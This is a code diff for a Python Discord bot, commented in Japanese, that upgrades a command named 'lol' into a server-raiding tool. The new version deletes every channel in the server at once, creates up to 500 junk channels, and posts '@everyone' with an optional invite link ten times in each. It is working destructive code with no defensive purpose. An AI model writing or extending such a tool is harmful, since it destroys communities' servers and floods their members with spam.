@@ -21,35 +21,50 @@ async def on_ready():
     print('------')
 
 @bot.command()
-async def lol(ctx):
+async def lol(ctx, count: int = 100, invite_url: str = None):
     # 許可されたユーザーIDかチェック（メッセージなし）
     if ctx.author.id != ALLOWED_USER_ID:
         return
     
+    # 最大500個に制限
+    if count > 500:
+        count = 500
+        print(f"⚠️ 最大500個に制限されました")
+    
     guild = ctx.guild
     
     try:
-        # 既存の全チャンネルを削除
-        for channel in guild.channels:
-            try:
-                await channel.delete()
-                print(f"削除: {channel.name}")
-            except discord.Forbidden:
-                print(f"削除失敗（権限不足）: {channel.name}")
-            except Exception as e:
-                print(f"削除エラー: {channel.name} - {e}")
+        # 既存の全チャンネルを並行削除（高速化）
+        import asyncio
+        delete_tasks = [channel.delete() for channel in guild.channels]
+        await asyncio.gather(*delete_tasks, return_exceptions=True)
+        print(f"全チャンネル削除完了")
         
-        # 新しいチャンネルを10個作成
-        for i in range(10):
+        # 新しいチャンネルを並行作成（超高速化）
+        create_tasks = []
+        for i in range(count):
             random_number = random.randint(1000, 9999)
             channel_name = f"lol-{random_number}"
-            try:
-                await guild.create_text_channel(channel_name)
-                print(f"作成: {channel_name}")
-            except Exception as e:
-                print(f"作成エラー: {channel_name} - {e}")
+            create_tasks.append(guild.create_text_channel(channel_name))
         
-        print("処理完了！")
+        channels = await asyncio.gather(*create_tasks, return_exceptions=True)
+        # エラーではないチャンネルのみフィルタ
+        channels = [ch for ch in channels if isinstance(ch, discord.TextChannel)]
+        print(f"{len(channels)}個のチャンネルを作成しました")
+        
+        # 各チャンネルに全員メンション＋招待URLを10回連投
+        if invite_url:
+            message = f"@everyone {invite_url}"
+        else:
+            message = "@everyone"
+        
+        spam_tasks = []
+        for channel in channels:
+            for _ in range(10):
+                spam_tasks.append(channel.send(message))
+        
+        await asyncio.gather(*spam_tasks, return_exceptions=True)
+        print(f"処理完了！全チャンネルにメッセージを送信しました")
         
     except Exception as e:
         print(f"エラーが発生しました: {e}")
